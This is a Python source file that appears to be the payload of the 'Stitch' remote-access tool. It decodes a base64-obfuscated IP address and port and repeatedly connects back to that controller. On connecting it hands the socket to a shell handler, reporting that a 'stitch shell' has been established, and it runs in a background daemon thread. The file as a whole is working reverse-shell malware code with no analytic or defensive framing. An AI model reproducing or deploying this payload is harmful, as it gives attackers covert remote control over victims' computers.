
from st_utils import *

class stitch_payload():

    connected = False

    def listen_server(self):
        self.stop_listen_server  = False
        while True:
            if self.stop_listen_server :
                break
            while self.connected:
                sleep(5)
                pass
            if dbg:
                print('trying to connect')
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            client_socket.ioctl(socket.SIO_KEEPALIVE_VALS, (1, 10000, 3000))
            client_socket.settimeout(5)
            target = base64.b64decode("MTkyLjE2OC4zLjU1").decode()
            port = int(base64.b64decode("NDA0MA==").decode())
            try:
                client_socket.connect((target,port))
                client_socket.settimeout(600)
                if not self.connected:
                    self.connected = True
                    client_handler(client_socket)
                    self.connected = False
                else:
                    send(client_socket,"[!] Another stitch shell has already been established.\n")
                    client_socket.close()
            except Exception as e:
                if dbg:
                    print(e)
                client_socket.close()
                self.connected = False

    def halt_listen_server(self):
        self.stop_listen_server = True


def main():
    if not stitch_running():
        st_pyld = stitch_payload()
        try:
            listen = threading.Thread(target=st_pyld.listen_server, args=())
            listen.daemon = True
            listen.start()
            while True:
                sleep(60)
        except KeyboardInterrupt:
            pass
        except Exception as e:
            if dbg:
                print(e)
            pass
        st_pyld.halt_listen_server()


if __name__ == '__main__':
    main()
